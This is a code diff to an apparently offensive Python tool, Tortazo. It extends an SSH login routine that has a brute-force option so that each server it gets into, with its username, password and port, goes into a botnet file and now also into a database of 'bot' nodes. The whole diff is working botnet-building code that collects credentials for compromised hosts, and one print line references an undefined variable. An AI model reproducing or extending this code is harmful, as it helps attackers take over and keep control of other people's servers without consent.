@@ -100,7 +100,7 @@ class ServiceConnector():
                     return False
 
 
-    def performSSHConnection(self, host, port, user, passwd, brute=False):
+    def performSSHConnection(self, host, port, user, passwd, brute=False, databaseConnection=None, torNodes=[]):
         '''
         Perform SSH Connections using the tortazo_botnet.bot file.
         '''
@@ -120,6 +120,7 @@ class ServiceConnector():
             print "An error ocurred. See the full trace: "
             print sys.exc_info()
             raise exc
+
         if client:
             print "[+] SSH Connection Success ... "
             client.close()
@@ -139,18 +140,30 @@ class ServiceConnector():
                     tortazoFd = open(tortazoFile, 'a')
                 #host:user:pass:port:nickname
                 nickname = '--'
-                for torNode in self.torNodes:
+                for torNode in torNodes:
                     if torNode.host == host:
                         nickname = torNode.nickName
                         break
                 entryBotnet = '%s:%s:%s:%s:%s' %(host, user, passwd, port, nickname)
                 content = open(tortazoFile, 'r').readlines()
+
                 if entryBotnet in content:
                     print "[-] Entry duplicated. Server already added in the 'tortazo_botnet.bot' file"
                 else:
                     tortazoFd.write(entryBotnet+'\n')
                     print "[+] Entry %s added" %(entry)
                     tortazoFd.close()
+                try:
+                    if databaseConnection.searchBotnetNode(host) == None:
+                        print "[+] Inserting bot in database."
+                        databaseConnection.insertBotnetNode(host, user, passwd, port, nickname, "ssh")
+                        print "[+] Inserted bot %s ." %(host)
+                    else:
+                        print "[+] The bot already exists in database."
+                except:
+                    import sys
+                    print sys.exc_info()
+
             return True
 
     def performSSHConnectionHiddenService(self, onionService, port, user, passwd):
